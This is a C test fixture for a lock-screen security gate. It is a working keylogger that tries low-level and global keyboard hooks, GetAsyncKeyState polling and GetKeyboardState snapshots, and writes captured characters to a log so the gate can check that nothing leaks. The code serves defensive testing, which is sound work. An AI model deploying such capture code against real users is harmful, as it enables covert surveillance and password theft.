/* Adversarial test fixture: a keystroke-capturing program.
 *
 * This exists to be defeated. ADR 0009 claims that a program running in the
 * user's session cannot observe what is typed into the lock screen. That claim
 * is comfortable to believe and easy to get wrong, so the security gate starts
 * this program before locking, types a known string into the lock surface, and
 * fails if this program captured it.
 *
 * It therefore has to be a real attempt, using every capture path Wine
 * implements -- a fixture that tries nothing proves nothing. It is a TEST
 * FIXTURE: it is never installed into the image, only built under build/ for
 * the gate.
 *
 * Every technique appends to one log file, given as argv[1]. The gate greps
 * that file for the secret it typed.
 *
 * SPDX-License-Identifier: AGPL-3.0-or-later
 */
#include <windows.h>
#include <stdio.h>

static FILE *g_log;
static HHOOK g_ll_hook, g_hook;

static void record( const char *how, unsigned vk )
{
    if (vk == VK_SHIFT || vk == VK_CONTROL || vk == VK_MENU ||
        vk == VK_LSHIFT || vk == VK_RSHIFT || vk == VK_CAPITAL) return;
    /* Log the character an attacker would reconstruct, so the gate can grep for
     * its plaintext secret rather than for virtual-key numbers. */
    if (vk >= 0x20 && vk < 0x7f)
        fprintf( g_log, "%s %c\n", how, (char)vk );
    else
        fprintf( g_log, "%s [%02x]\n", how, vk );
    fflush( g_log );
}

/* Technique 1: WH_KEYBOARD_LL -- the low-level keyboard hook, the classic
 * system-wide keylogger. */
static LRESULT CALLBACK ll_proc( int code, WPARAM wp, LPARAM lp )
{
    if (code == HC_ACTION && (wp == WM_KEYDOWN || wp == WM_SYSKEYDOWN))
        record( "LL_HOOK", ((KBDLLHOOKSTRUCT *)lp)->vkCode );
    return CallNextHookEx( g_ll_hook, code, wp, lp );
}

/* Technique 2: WH_KEYBOARD -- the older global keyboard hook. */
static LRESULT CALLBACK kb_proc( int code, WPARAM wp, LPARAM lp )
{
    if (code == HC_ACTION && !(lp & (1 << 31)))  /* key down */
        record( "KB_HOOK", (unsigned)wp );
    return CallNextHookEx( g_hook, code, wp, lp );
}

int WINAPI WinMain( HINSTANCE inst, HINSTANCE prev, LPSTR cmd, int show )
{
    MSG msg;
    int i;
    DWORD deadline;

    (void)prev; (void)show;
    g_log = fopen( cmd[0] ? cmd : "Z:\\tmp\\sg-keylog.txt", "w" );
    if (!g_log) return 1;
    fprintf( g_log, "START\n" );
    fflush( g_log );

    g_ll_hook = SetWindowsHookExW( WH_KEYBOARD_LL, ll_proc, inst, 0 );
    g_hook    = SetWindowsHookExW( WH_KEYBOARD, kb_proc, inst, 0 );
    fprintf( g_log, "LL_HOOK=%s KB_HOOK=%s\n",
             g_ll_hook ? "installed" : "refused",
             g_hook ? "installed" : "refused" );
    fflush( g_log );

    /* Techniques 3 and 4: poll GetAsyncKeyState across the whole keyboard, and
     * take GetKeyboardState snapshots -- what a hook-less logger falls back to.
     * Run for a bounded time so the gate is never left waiting on us. */
    deadline = GetTickCount() + 60000;
    while (GetTickCount() < deadline)
    {
        BYTE state[256];

        for (i = 8; i < 256; i++)
            if (GetAsyncKeyState( i ) & 0x0001)   /* pressed since last call */
                record( "ASYNC", (unsigned)i );

        if (GetKeyboardState( state ))
            for (i = 8; i < 256; i++)
                if (state[i] & 0x80)
                    record( "KBSTATE", (unsigned)i );

        while (PeekMessageW( &msg, NULL, 0, 0, PM_REMOVE ))
        {
            TranslateMessage( &msg );
            DispatchMessageW( &msg );
        }
        Sleep( 5 );
    }

    fprintf( g_log, "END\n" );
    fclose( g_log );
    if (g_ll_hook) UnhookWindowsHookEx( g_ll_hook );
    if (g_hook) UnhookWindowsHookEx( g_hook );
    return 0;
}
